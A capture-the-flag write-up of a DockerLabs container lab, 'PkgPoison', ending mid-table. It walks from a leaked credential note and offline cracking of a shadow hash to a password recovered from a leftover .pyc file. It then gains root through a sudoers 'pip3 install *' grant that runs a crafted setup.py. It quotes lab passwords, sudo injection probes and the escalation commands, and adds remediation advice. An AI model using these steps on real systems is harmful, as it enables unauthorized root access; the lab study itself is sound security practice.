# 162 PkgPoison — DockerLabs Writeup

**Target:** `172.17.0.6` (container `pkgpoison_container`, image `pkgpoison:latest`, HOSTNAME `84dbffed895e`)
**Date:** 2026-10-01
**Outcome:** Privilege escalation to **`uid=0` / `euid=0`**, measured from inside the process and read back from outside the container over HTTP. Four rungs, four identities. **No `FLAG{}`** — measured absence, 17,577 files / 500,149,523 bytes / 6 patterns / 0 hits, positive control green.

**Catalogue entry:** *"Intrusión sencilla y escalada de privilegios mediante distintos pasos."*

---

## 0. The direct answer: is this a supply-chain lab?

**Yes — and not as a decoy.** The name is correct about the class, and wrong about
almost everything else. Read plainly:

> **An attacker who controls *what gets installed* does not need a vulnerability in
> the application.** Here there is no application at all — no PHP, no CMS, no
> framework, no `mod_php`, no database, three files and one subdirectory in the docroot. **The boundary is
> drawn at whatever decides the version**, and in this lab that boundary is a single
> `sudoers` wildcard.

The evidence is one 50-byte file, quoted verbatim (`od -c`, mode `644 root:root`,
50 bytes, **not owned by any dpkg package** — `dpkg -S` → `no path found matching pattern`):

```
/etc/sudoers.d/001-admin-task
admin ALL=(ALL) NOPASSWD: /usr/bin/pip3 install *
0000000   a   d   m   i   n       A   L   L   =   (   A   L   L   )
0000020   N   O   P   A   S   S   W   D   :       /   u   s   r   /   b
0000040   i   n   /   p   i   p   3       i   n   s   t   a   l   l
0000060   *  \n
```

`sudo -l`, read as `admin`, agrees:

```
User admin may run the following commands on 84dbffed895e:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

**What the package mechanism actually is.** Before answering, I established it,
because the brief asked and because the corpus's standing finding is that a class
label is a filename, not a fingerprint:

| Question asked of the artefact | Answer | How |
|---|---|---|
| Is there an application dependency? | **No** | docroot is 3 entries + 1 subdir: `index.html` 589 B, `index.png` 1,557,421 B, `notes/note.txt` 177 B. `ls /etc/apache2/mods-enabled/` — 27 entries, **no `php*`**, no `cgi` |
| Is there a package manager? | **Yes, the system one** | `dpkg -s python3-pip` → `Version: 20.0.2-5ubuntu1.11`; `/usr/lib/python3/dist-packages/pip-20.0.2.egg-info`; `pip3 --version` → `pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8)` |
| A lockfile? | **No** | `find / -xdev` for `package.json`, `package-lock.json`, `yarn.lock`, `requirements.txt`, `Pipfile*`, `poetry.lock`, `composer.json`, `composer.lock`, `Gemfile*`, `go.mod`, `Cargo.toml`, `*.whl`, `*.egg-info`, `vendor`, `node_modules` → 28 `.whl` + 11 `.egg-info`, **all of them the stock Ubuntu base image** (`/usr/share/python-wheels/`, `/usr/lib/python3/dist-packages/`). **Zero** hits in `/opt`, `/var/www`, `/srv`, `/home`, `/usr/local` |
| A vendored dependency? | **No** | as above |
| A build step that installs something? | **No Dockerfile to read** | `docker history --no-trunc pkgpoison:latest` → **exactly one line**, `sha256:9ec88646ca1b… 16 months ago 571MB Imported from -`. Unlike lab 188 there is no layer record to read; the squash destroyed it |
| A registry reference? | **Yes, and it is the bug** | the registry the installer is pointed at is chosen by the *caller*, because the argument specification is `install *` |

So: the package mechanism present is **`pip` on the host**, and the attack surface is
**the install path itself**, delegated to root by a policy line. This is not
dependency confusion (a name an attacker can register); the attacker here does not
need a registry at all, because the wildcard lets them hand the installer an
arbitrary local path.

**Cross-read, as the brief requires.** Lab 281 (PipePwned) is the nearest sibling and
it is a *different* class: there, a root daemon polls `/opt/ci/builds/*.sh`, a
group-writable directory, so the attacker authors the job. Here there is **no daemon
and no attacker-authored file on any build path** — the delegation is a `sudoers`
argument specification, and the thing the caller controls is **which artifact the
installer resolves and executes**, not a file the runner will pick up. Lab 93 named
an interpreter with no argument list; lab 282 showed a grant that pins *both*
arguments (9 forms, 8 denied). **Lab 162 is the fourth data point and it agrees with
282: the discriminator is the argument specification.** `install *` leaves the
requirement specifier — the version selector — entirely to the caller.

A search of the 58 existing writeups for this class:

```
'pip install' / 'pip3 install'   -> 0 writeups
'dependency confusion'           -> 0
'confusión de dependencias'      -> 0
'version selector'              -> 0
```

**The class is absent from the corpus.** Not extended: new.

---

## 1. Deploy

| Step | Result |
|---|---|
| Fetch | already verified: `~/dockerlabs/state/162.ok`; `dist/pkgpoison.zip` 163.7M |
| Extract | `env DL_ROOT=~/dockerlabs tooling/download-labs.sh extract 162` → `labs/162/` = `pkgpoison.tar` (165.6M) + `auto_deploy.sh` (5.1K) |
| Image | `docker load -i pkgpoison.tar` → `Loaded image: pkgpoison:latest`, `9ec88646ca1b`, 1.11GB (535MB compressed) |
| Run | `docker run -d --name pkgpoison_container pkgpoison:latest` → `172.17.0.6`, HOSTNAME `84dbffed895e` |

`auto_deploy.sh` was **read, not run** (it ends in `while true; do sleep 1; done`,
line 145). It describes a **single-container, single-`docker run -d`, default-bridge**
topology — no networks, no macvlan, no second host. That matched what I got.

`/etc/entrypoint.sh`, in full:

```bash
#!/bin/bash
service ssh start
service apache2 start
tail -f /dev/null
```

**Note the entrypoint is not the vulnerability and does not contain one.** Reading it
first cost ten seconds and produced the whole architecture: two services, no
supervisor, no database, no application server. That is §3 of the RUNBOOK paying for
itself.

---

## 2. Versions, from version-bearing files only

| Component | Version | Source (read, not recalled) |
|---|---|---|
| OS | Ubuntu 20.04.6 LTS (Focal Fossa) | `/etc/os-release` `PRETTY_NAME="Ubuntu 20.04.6 LTS"` |
| Web | Apache httpd **2.4.41-4ubuntu3.23** | `dpkg -s apache2` → `Version:` |
| SSH | OpenSSH **1:8.2p1-4ubuntu0.13** | `dpkg -s openssh-server` → `Version:` |
| sudo | **1.8.31-1ubuntu1.5** | `dpkg -s sudo` → `Version:` |
| Python | **3.8.10** | `python3 -V` |
| pip | **20.0.2-5ubuntu1.11** | `dpkg -s python3-pip`; corroborated by `pip-20.0.2.egg-info` and `pip3 --version` |
| setuptools | 45.2.0-1ubuntu0.2 | `dpkg -s python3-setuptools` |

`nmap -sV` agrees with the artefact on both services, which is the point — the versions
in this table came from `dpkg`, and the scanner only confirmed them.

---

## 3. Surface

```
$ nmap -sV -Pn -p- 172.17.0.6
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Not shown: 65533 closed tcp ports (conn-refused)
```

**UDP, measured rather than assumed** (`nmap -sU` refused: *You requested a scan type
which requires root privileges*), so the second instrument was the kernel's own table:

```
$ cat /proc/net/udp      →  1 line (header only)
$ cat /proc/net/udp6     →  1 line (header only)
```

**0 UDP sockets.** The absent class is measured, not blind.

Docroot, complete:

```
$ ls -la /var/www/html
-rw-r--r-- 1 www-data www-data     589 May 20  2025 index.html
-rw-r--r-- 1 www-data www-data 1557421 May 20  2025 index.png
drwxr-xr-x 2 www-data www-data    4096 May 20  2025 notes
$ ls -la /var/www/html/notes
-rw-r--r-- 1 www-data www-data     177 May 20  2025 note.txt
```

`index.png` was checked for a hidden channel and has none: valid PNG, 1024×1024,
`IEND` at offset 1,557,413, **−4 bytes** of trailing data (i.e. `IEND` + CRC is the
last 8 bytes and there is nothing after it), **no `tEXt`/`iTXt`/`zTXt` chunk**. Its
content is a wireframe mock-up of `index.html` ("What are you looking for?").

Everything on the box that the lab author touched, found by mtime and not by guessing:

```
$ find / -xdev -newermt 2025-05-16 ! -newermt 2025-05-26 -type f | grep -vE '^/(usr|etc|var/lib|var/cache|var/log|snap)'
/var/www/html/index.png
/var/www/html/index.html
/var/www/html/notes/note.txt
/run/sudo/ts/dev
/run/motd.dynamic
/run/utmp
/run/systemd/resolve/stub-resolv.conf
/opt/scripts/__pycache__/secret.cpython-38.pyc
/root/.bash_history
/home/dev/.bash_history
/home/admin/.bash_history
```

**9 files outside the stock package set, and that list is the whole lab.** Two accounts
with shells, no others:

```
$ grep -E 'bash$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000::/home/dev:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```

---

## 4. Chain

Every rung carries the identity the brief demands, quoted from the process itself.

| # | → | Mechanism | Identity proof (verbatim) |
|---|---|---|---|
| 0 | anonymous | `GET /notes/note.txt` — credential-shaped string in a world-readable file in the docroot | `HTTP/1.1 200 OK`, `Content-Length: 177`. Control: `GET /notes/nosuchfile-dl162` → `404`, `272` bytes |
| 1 | `dev` | **the published credential does not work**; `dev`'s real password recovered offline against the yescrypt hash in `/etc/shadow` | `uid=1000(dev) gid=1000(dev) groups=1000(dev)`; `/proc/self/status` → `Uid: 1000 1000 1000 1000` |
| 2 | `admin` | `strings -a` on a **world-readable `.pyc` whose `.py` the author deleted** | `uid=1001(admin) gid=1001(admin) groups=1001(admin)`; `Uid: 1001 1001 1001 1001` |
| 3 | root | `sudo -n /usr/bin/pip3 install <path>` — the grant's wildcard hands the caller the **requirement specifier** | `getuid: 0`, `geteuid: 0`, `getgid: 0`, `getegid: 0`, `Uid: 0 0 0 0`, `Gid: 0 0 0 0`, `SUDO_USER: admin`, `SUDO_UID: 1001` |

### Rung 0 — the leak, and an impossible-name control

```
$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://172.17.0.6/notes/note.txt
200 177

Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```

Control, run before the leak is read as a credential:

```
$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://172.17.0.6/notes/nosuchfile-dl162
404 272
```

Two different answers, so the 200 is a real document and not a catch-all.

### Rung 1 — the published credential is dead, and saying so is a finding

`dev:developer123` **does not authenticate.** Three independent instruments agree:

```
# 1. paramiko (raw SSH password auth)
paramiko.ssh_exception.AuthenticationException: Authentication failed.

# 2. OpenSSH with a real pty — the client a human would use
$ ssh -tt dev@172.17.0.6 id
dev@172.17.0.6's password:
Permission denied, please try again.

# 3. the hash itself, read in place from /etc/shadow, no transcription
dev hash_len 106 prefix $6$
    'developer123' -> no $6$YA2eCXQ1XxMyE8Bv$...
    'p@$$w0r8321'   -> no $6$YA2eCXQ1XxMyE8Bv$...
    'dev'           -> no $6$YA2eCXQ1XxMyE8Bv$...
    'admin'         -> no $6$YA2eCXQ1XxMyE8Bv$...
admin hash_len 106 prefix $6$
    'p@$$w0r8321'   -> MATCH $6$NsbvfqygsGmZKnyK$...
```

`crypt.crypt()` here is libxcrypt yescrypt on the target, and **the same oracle
returned MATCH for `admin` in the same run** — so the negative for `dev` is a negative
about the credential, not about the instrument.

The real password for `dev` is **`computer`**, recovered offline. The oracle was
proven green **before** the sweep was believed:

```
POSITIVE CONTROL: admin/p@$$w0r8321 -> MATCH (oracle works)
LIST /tmp/dl162.txt    candidates 24386  FOUND 'computer'
LIST /tmp/dl162big.txt candidates 321373 FOUND 'computer'
```

Both lists independently returned the same string — 24,386 candidates in
`sorted-passwords.txt` (101,074 lines) and 321,373 in `Passwords.txt` (517,506 lines),
against `dev`'s `$6$` yescrypt hash. Rate measured on the target first: **1,009
hashes/s per process**; 24,386 candidates is 24.2 s, 321,373 is 318.5 s. Each sweep
**aborted on the match**, which is why the two candidate counts differ — they are
positions in two different lists, not two sweeps of the same list. Confirmed by SSH:

```
$ ssh -tt dev@172.17.0.6 'id; grep -E "^(Name|Uid|Gid|Groups)" /proc/self/status'
dev@172.17.0.6's password: computer
uid=1000(dev) gid=1000(dev) groups=1000(dev)
dev
Uid:	1000	1000	1000	1000
Gid:	1000	1000	1000	1000
Groups:	1000
```

**This is where the lab's advertised chain breaks.** A solver who trusts the note
never enters. That is Finding F4, and it is the lab's problem, not the testerisation's.

### Rung 2 — a deleted `.py`, and the `.pyc` that outlived it

```
$ ls -l /opt/scripts/__pycache__/secret.cpython-38.pyc
-rw-r--r-- 1 admin admin 274 May 24  2025 /opt/scripts/__pycache__/secret.cpython-38.pyc

$ strings -a /opt/scripts/__pycache__/secret.cpython-38.pyc
adminz
p@$$w0r8321z
Authenticating...)
print)
usernameZ
passwordZ
	secret.py	auth
```

Mode `644`, owner `admin`, in a `755` directory tree: **readable by every identity on
the box**, including `dev`. `test -w` read as `dev` said `NOT-writable`, so it is a
read, not a write primitive.

The author left the receipts in `/root/.bash_history`, which is operator-side evidence
about *how the lab was built* and is quoted as such (this is not how an attacker would
learn it — the `.pyc` is world-readable):

```
$ cd /opt/scripts/
vim secret.pu
mv secret.pu secret.py
python3 -m py_compile secret.py
rm -rf __pycache__/
rm secret.py
vim secret.py
python3 -m py_compile secret.py
chown admin:admin /opt/scripts/__pycache__/secret.cpython-38.pyc
chmod 644 /opt/scripts/__pycache__/secret.cpython-38.pyc
…
pip3 install uncompyle6
```

`rm secret.py` **twice**, and the compiled artefact is still there, world-readable.
The same history contains `pip3 install uncompyle6` — run by **root, by the author,
while building the lab**. That is not the vulnerability; it is the class, sitting in
the build history, one indentation level away from being it.

`admin`'s password was confirmed against its hash (`MATCH`, above) before it was used:

```
$ ssh -tt admin@172.17.0.6 'id; grep -E "^(Name|Uid|Gid|Groups)" /proc/self/status'
admin@172.17.0.6's password:
uid=1001(admin) gid=1001(admin) groups=1001(admin)
Uid:	1001	1001	1001	1001
Gid:	1001	1001	1001	1001
Groups:	1001
```

### Rung 3 — the argument specification, 14 forms, measured

Per lab 282, the discriminator is the argument specification and not the fact that the
named program is an interpreter. So I measured the specification instead of reading it
out of `man 5 sudoers` — which is not installed on this image (`/usr/share/man/man5/`
does not exist), a fact worth noting, because it means the man-page reading of a
sudoers wildcard **cannot be checked on the target**.

Positive control first, and it fired:

```
$ sudo -l                        # as admin
User admin may run the following commands on 84dbffed895e:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

```
=== FORM: sudo -n /usr/bin/pip3 install --help
VERDICT[ALLOWED_BY_SUDOERS] rc=0  bytes=12638            <- POSITIVE CONTROL, fired
=== FORM: sudo -n /usr/bin/pip3
sudo: a password is required
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
=== FORM: sudo -n /usr/bin/pip3 list
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
=== FORM: sudo -n /usr/bin/pip3 --version
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
=== FORM: sudo -n /usr/bin/pip3 Install --help
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28            <- case-sensitive
=== FORM: sudo -n /usr/bin/pip3 uninstall setuptools
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
=== FORM: sudo -n /usr/bin/pip3 download --help
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
=== FORM: sudo -n /usr/bin/pip3 install -r /etc/hostname
ERROR: Could not find a version that satisfies the requirement 84dbffed895e
VERDICT[ALLOWED_BY_SUDOERS] rc=1  bytes=218              <- '*' spans SPACES
=== FORM: sudo -n /usr/bin/pip3 install ;id
VERDICT[ALLOWED_BY_SUDOERS] rc=2  bytes=6274             <- passed LITERALLY to pip
=== FORM: sudo -n /usr/bin/pip3 install $IFS
ERROR: Invalid requirement: '$IFS'
VERDICT[ALLOWED_BY_SUDOERS] rc=1  bytes=34               <- no shell, so no $IFS split
=== FORM: sudo -n /usr/bin/pip3 install /dev/null
VERDICT[ALLOWED_BY_SUDOERS] rc=2  bytes=3504
=== FORM: sudo -n /bin/sh
VERDICT[DENIED_NEEDS_PASSWORD] rc=1  bytes=28
=== FORM: sudo -n /usr/bin/pip3 install --target /tmp/dl162_probe --help
VERDICT[ALLOWED_BY_SUDOERS] rc=0  bytes=12638            <- '*' spans SPACES
```

**14 forms: 6 allowed, 8 denied.** Three measured properties of the specification, each
with a form behind it:

1. `install` must be **argv[1]**, literally and case-sensitively. `list`, `--version`,
   `uninstall`, `download` and `Install` are all denied.
2. `*` matches **the rest of the command line including spaces** — proven by
   `install -r /etc/hostname` and `install --target /tmp/dl162_probe --help`, both
   allowed, neither of which is a single token.
3. `sudo` does **not** invoke a shell, so there is no metacharacter injection: `$IFS`
   reached pip as the six literal characters `$IFS` (`Invalid requirement: '$IFS'`).
   The exposure is not a shell. It is the specifier.

### Rung 4 — root, with the payload as its own oracle

`pip3 install` on a local path runs the project's `setup.py` **as the installing
identity**. That vector has no output of its own, so the payload was built to write
witnesses, and one of them was placed where the unprivileged identity provably cannot
write.

Pre-state, read as `admin`:

```
$ ls -la /root
ls: cannot open directory '/root': Permission denied
$ test -w /root && echo WRITABLE || echo NOT
/root NOT writable by admin
```

Then the grant:

```
$ sudo -n /usr/bin/pip3 install /home/admin/evilpkg
Processing ./evilpkg
Building wheel for dl162-probe (setup.py): started
Building wheel for dl162-probe (setup.py): finished with status 'done'
Successfully built dl162-probe
Installing collected packages: dl162-probe
Successfully installed dl162-probe-0.0.1
rc=0
```

**Read back from outside the container**, over HTTP, served by Apache as `www-data`:

```
$ curl -s http://172.17.0.6/dl162-proof-DL162-e7c41a9b.json
{
  "token": "DL162-e7c41a9b",
  "hostname": "84dbffed895e",
  "getuid": 0,
  "geteuid": 0,
  "getgid": 0,
  "getegid": 0,
  "pid": 641,
  "ppid": 636,
  "cwd": "/tmp/pip-req-build-9rd7y7l9",
  "argv": [
    "/tmp/pip-req-build-9rd7y7l9/setup.py",
    "egg_info",
    "--egg-base",
    "/tmp/pip-req-build-9rd7y7l9/pip-egg-info"
  ],
  "SUDO_USER": "admin",
  "SUDO_UID": "1001",
  "USER": "root",
  "getpass.getuser()": "root",
  "proc_self_status": [
    "Name:\tpython3",
    "Uid:\t0\t0\t0\t0",
    "Gid:\t0\t0\t0\t0",
    "Groups:\t0"
  ]
}
```

Four things in that body earn their place:

- `Uid: 0 0 0 0` and `Gid: 0 0 0 0` — **real and effective are both 0**. This is a
  genuine setuid-style transition, and the *pair* is reported, not the word "root".
- `SUDO_USER: admin`, `SUDO_UID: 1001` — the transition is attributable to this grant
  and this caller, not to anything else on the box.
- `argv[0]` is **inside a pip temp directory**, `pip-req-build-*`, and `argv[1]` is
  `egg_info` — the payload did not run because I ran it. It ran because pip's build
  path executed it. That is what separates this from "I wrote a script as root".
- the file is served by Apache as `www-data` and was created `root:root`, so the
  witness crosses the trust boundary and not merely a shell prompt.

### The differential control — same code, one hop apart

This is the pair that makes the finding a finding. Identical payload, unique token per
run, both runs read back:

| Run | `getuid` | `geteuid` | `SUDO_USER` | write `/root` | write `/var/www/html` |
|---|---|---|---|---|---|
| **A** — unprivileged, `python3 setup.py egg_info` | **1001** | **1001** | `null` | `PermissionError` | `PermissionError` |
| **B** — `sudo -n /usr/bin/pip3 install …` | **0** | **0** | `admin` | `WROTE` | `WROTE` |

```
=== CONTROL A: same code, UNPRIVILEGED, unique token ctr1790814565-713
{ "/root": "FAILED on /root/dl162-ctr1790814565-713.json: PermissionError",
  "/var/www/html": "FAILED on /var/www/html/dl162-ctr1790814565-713.json: PermissionError",
  "/tmp": "WROTE /tmp/dl162-ctr1790814565-713.json" }
  "getuid": 1001, "geteuid": 1001, "SUDO_USER": null,

=== CONTROL B: same code, VIA THE SUDO GRANT, unique token ctr1790814565-713B
--- what the root run recorded:
  "getuid": 0, "geteuid": 0, "getgid": 0, "getegid": 0, "SUDO_USER": admin,
--- witness table written by the ROOT run:
{ "/root": "WROTE …", "/var/www/html": "WROTE …", "/tmp": "WROTE …" }
```

One class, two `id`s, one hop. Without row A the second row is a string.

### The artifact form, not just the directory form

The same grant, pointed at a distribution artifact from a repository **the caller
names**, entirely on localhost — no third party touched:

```
### build the sdist as admin (uid 1001)
-rw-rw-r-- 1 admin admin 1116 dl162reg-0.0.2.tar.gz

### unprivileged baseline witness:
  "getuid": 1001, "geteuid": 1001, "SUDO_USER": null,

### install THAT ARTIFACT through the grant, naming the repository
$ sudo -n /usr/bin/pip3 install --no-index --find-links file:///home/admin/repo2 dl162reg
  Building wheel for dl162reg (setup.py): finished with status 'done'
  Stored in directory: /root/.cache/pip/wheels/69/15/c8/73e2c6cc968bd9e93a0bede306aa99ee57ae39810f604591d2
Successfully built dl162reg
Successfully installed dl162reg-0.0.2
```

Read back from outside:

```json
{ "token": "reg31790814946-874", "version": "0.0.2",
  "getuid": 0, "geteuid": 0, "pid": 899, "cwd": "/tmp/pip-install-lf487829/dl162reg",
  "argv": ["/tmp/pip-install-lf487829/dl162reg/setup.py", "bdist_wheel", "-d", "/tmp/pip-wheel-8ufftjd0"],
  "SUDO_USER": "admin",
  "status": ["Uid:\t0\t0\t0\t0", "Gid:\t0\t0\t0\t0"] }
```

`pip` fetched, unpacked and executed build code out of an archive the caller supplied
from an index the caller supplied. `--index-url` is accepted at the sudoers layer too
(`Looking in indexes: http://127.0.0.1:9/simple/` — sudo allowed it; pip failed on
the connection, which is a pip outcome, not a sudo outcome).

### Persistent root-owned residue

Two artefacts survive the session and are root-owned, which is the part an operator
would actually have to clean up:

```
drwxr-sr-x 2 root staff 4096 /usr/local/lib/python3.8/dist-packages/dl162_probe-0.0.1.dist-info
drwxr-sr-x 2 root staff 4096 /usr/local/lib/python3.8/dist-packages/dl162reg-0.0.2.dist-info
/root/.cache/pip/wheels/d4/6f/bc/…/dl162io-0.0.1-py3-none-any.whl
```

The wheel cache landed in **`/root/.cache/pip`** — the root-privileged installer wrote
into root's home. Everything here is gone after the restore (see §9).

---

## 5. Findings

### F1 — `sudoers` delegates a package installer with an unconstrained requirement specifier → `uid=0`

**CWE-269** (Improper Privilege Management) · **CWE-250** (Execution with Unnecessary
Privileges) · **CWE-732** (Incorrect Permission Assignment for Critical Resource) ·
severity: **critical**

`/etc/sudoers.d/001-admin-task`, whole file, quoted in §0. The literal string `install`
is pinned. Everything after it is `*`, and §4 measured that `*` spans the entire rest of
the command line including spaces. The caller therefore chooses:

- **which artifact** — a local directory, a local sdist, or anything reachable from a
  repository the caller names;
- **which index** — `--index-url`, `--find-links`, `--no-index`, `-r`, `-e`, `--target`
  are all inside the wildcard and all were measured ALLOWED;
- **whose build code runs** — `setup.py` executes as `uid=0`.

No vulnerability in any application is required or involved, because there is no
application. The grant *is* the attack surface.

**Impact.** Any compromise of `admin` — and this lab ships two trivial ones (F2, F3) —
is immediately root. The escalation needs no exploit, no memory corruption, no TOCTOU:
a 1,628-byte text file and one command.

**Root cause.** An authorisation policy written as a *program name plus a wildcard*,
where the named program's entire purpose is to fetch and execute third-party code, and
where the wildcard covers the one argument that selects the third party.

**Remediation.** Stop delegating an installer. If a root-privileged install is genuinely
required, put it behind a root-owned wrapper that takes no attacker-controlled
arguments and grant the wrapper. If it must be delegated: pin the runas to `(root)`
rather than `(ALL)` (lab 93's secondary note — it changes nothing while the program is
an interpreter, and it is the difference between a finding and a no-finding the moment
it is not), name a fixed artifact path under a root-owned directory, and replace `*`
with the exact argument vector. Add a build-isolation requirement — `pyproject.toml`
with PEP 517 — so a hostile `setup.py` is not executed at all; note that pip's
`--no-build-isolation` and legacy sdists would then be the thing to forbid.

### F2 — The credential the docroot publishes does not authenticate, and the one that does is a dictionary word

**CWE-200** (Exposure of Sensitive Information) + **CWE-521** (Weak Password
Requirements) · severity: **medium** as exposure, **high** as the actual state of the box

`/var/www/html/notes/note.txt`, 177 bytes, mode `644 www-data:www-data`, served to the
world:

```
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```

Two distinct defects in one 177-byte file, reported separately because they have
different fixes:

- **The published credential is wrong.** `dev:developer123` fails against SSH
  (§Rung 1, three instruments). Publishing a stale credential in cleartext is a leak
  *and* a broken hint; an operator who trusts it is stuck.
- **The real credential is a common dictionary word.** `dev:computer`, `$6$` yescrypt,
  recovered offline in **24,386 candidates** — 24.2 s at the measured 1,009 hashes/s,
  one list per process.
  A 6-character lowercase dictionary word is not a password.

Root cause: no secret-handling discipline at all — a plaintext credential in a served
file, plus account passwords chosen from a common wordlist.

Remediation: delete the note from the docroot; if a note must exist, it must not contain
a credential of any kind, valid or not. Enforce a password policy and prefer
`PasswordAuthentication no` with keys (lab 281 makes this point on its own SSH surface).

### F3 — `admin`'s password is stored as a deleted source file's bytecode, mode 644

**CWE-522** (Insufficiently Protected Credentials) + **CWE-312** (Cleartext Storage of
Sensitive Information) · severity: **high**

`/opt/scripts/__pycache__/secret.cpython-38.pyc`, 274 bytes, `-rw-r--r-- admin admin`,
in a `755` tree. `strings -a` gives `admin` / `p@$$w0r8321` and the keys
`username` / `password`. **Every local identity on the host can read it**, which is how
`dev` becomes `admin`, and `admin` is the sudoers identity — so F3 is the step that
converts F2 into F1.

The author's own build history shows the mistake being made and unmade:

```
vim secret.py
python3 -m py_compile secret.py
rm secret.py
```

`rm secret.py` deletes the readable file and leaves the equally readable compiled copy.
**Deleting a secret's source does not delete the secret.**

Remediation: never keep credentials in the image at all. If a bootstrap credential is
unavoidable, inject it at first boot from the host, `chmod 600`, and remove the build
artefacts (`__pycache__` included) from the image.

### F4 — Lab design: the advertised first step does not work

Reported as the **lab's** problem, in the tradition of labs 112, 168, 220 and 282.

The catalogue says *"simple intrusion then privesc by a distinct steps"*. The **shape**
is exactly right: four distinct identities, four distinct decisions, and the escalation
vector is genuinely not the entry vector. But the **first step does not execute** —
the only credential the target publishes is wrong — so the intrusion is a 24,386-candidate
offline crack rather than a disclosed hint. Either the note should carry the working
credential, or the note should not exist.

A second, cosmetic design observation: `/etc/sudoers.d/001-admin-task` is mode **644**,
not the 0440 `sudoers(5)` recommends. It is not world-writable, so `sudo` accepts it and
this is **not** filed as a finding — but a lab about a sudoers misconfiguration is an odd
place to ship a second, unrelated one, and an auditor will ask.

### F5 — A root daemon is not required, and the absence is worth stating

Not a finding; a **discarded hypothesis**, recorded because it is the obvious one.
"`pip3 install` runs a build; a build might install something else" — no. Measured:
`/etc/cron.d` has **1** entry and it is stock (`e2scrub_all`, running as root, binary
`/usr/sbin/e2scrub_all` from dpkg, mode `755 root:root`, not writable by `admin`); there
is **no** `/etc/crontab`; `/etc/cron.daily` holds the three stock dpkg scripts. No
scheduler in this lab re-reads anything an attacker wrote.

---

## 6. Controls that held

Every row's positive control is stated, because a control that has never fired is not a
control.

| Control | Positive control that proves the detector works |
|---|---|
| **`dev` has no sudo grant** | `sudo` **prompted for `dev`'s password and accepted it** (`[sudo] password for dev:`) before answering `Sorry, user dev may not run sudo on 84dbffed895e.` — so the sudo path is live for `dev` and the policy is empty, not the tool broken. Cross-checked by reading the policy: the only `sudoers.d` file is `001-admin-task`, which names `admin` |
| **The sudoers argument specification really does restrict something** | `sudo -n /usr/bin/pip3 install --help` → `ALLOWED`, `rc=0`, **12,638 bytes** of pip usage text. The detector fires, so the 8 denials are denials |
| **`sudo` does not launder a shell** | `install $IFS` reached pip as `Invalid requirement: '$IFS'` — 6 literal characters. A shell *would* have split it. The wildcard's power is the specifier, not metacharacters |
| **No setuid path from `dev` or `admin`** | 11 setuid binaries found; `test -w` **read as `dev`** (`uid=1000`) → **0** writable; read as `admin` (`uid=1001`) → **0** writable. Both are the identity that would execute the payload. **And the corpus's standing trap, measured for contrast:** `find / -xdev -perm -u+w -type f` → **17,606** files carrying the *owner's* write bit, of which **0 of 11** setuid binaries are writable by the identity that cares |
| **No file capabilities anywhere** | **This one needed a new instrument.** `getcap` is **not installed** on this image, so every "`getcap` → 0 lines" reading in this engagement was a missing command printing nothing (§11). Replaced with a direct `os.getxattr(p, "security.capability")` walk, with the control **staged and then found by the same walk**: `POSITIVE CONTROL staged. readback: 0100000200000000800000000000000000000000`, `the control is IN this list, so the walk can find one: True`. Result over 20,087 walked files and then over `/usr /bin /sbin /lib /etc /opt /home /var /root /tmp`: **0** files carrying the xattr |
| **No cron path** | `/etc/cron.d` read as `admin`: 1 entry, `e2scrub_all`, its target binary `/usr/sbin/e2scrub_all` is `755 root:root` and `test -w` as `admin` says `ro` |
| **The escalation files are not writable by the lower identities** | `test -w` read **as `dev`** on `/etc/sudoers.d/001-admin-task` → `NOT-writable`; on the `.pyc` → `PYC-NOT-writable`; read **as `admin`** on `/etc/sudoers`, `/etc/sudoers.d/001-admin-task`, `/etc/passwd`, `/etc/shadow`, `/etc/cron.d`, `/etc/ld.so.conf.d` → all `ro`. The predicate is read by the identity that would use it, never through `docker exec` |
| **`su` is not a ladder** | `su - admin` as `dev` with `dev`'s own password → `su: Authentication failure`. Same `crypt` oracle already proved green on `admin`'s real password, so this is a negative about the credential, not the call |
| **No UDP surface is being missed by a TCP scan** | `/proc/net/udp` and `/proc/net/udp6` → **1 line each, header only**. `nmap -sU` refused for lack of privileges, so this is a second instrument, not a blind spot |
| **The docroot is not a write primitive for either identity** | `test -w` as `admin` on `/var/www/html` → not writable; the only writes that landed there were `root:root`, i.e. the escalation's own product |
| **The reward sweep's grep can find a string that exists** | pattern `Ubuntu` → **51 files**; and on the binary pass, a marker appended to a copy of `/usr/bin/python3.8` → **1 line** |
| **The restore** | `GET /` → `200` / **589 bytes**; `GET /notes/note.txt` → `200` / **177 bytes**; impossible-name control `GET /notes/nosuchfile-dl162` → `404` / **272 bytes**. Docroot back to 3 shipped entries; `/home/admin`, `/home/dev`, `/root` back to dotfiles only; `ls /usr/local/lib/python3.8/dist-packages/ | grep -i dl162` → `none`; `ls /tmp | grep -i dl162` → `none`; the grant and the `.pyc` still in place |

---

## 7. Negatives, each with its work count

| Negative | Work done | Instrument |
|---|---|---|
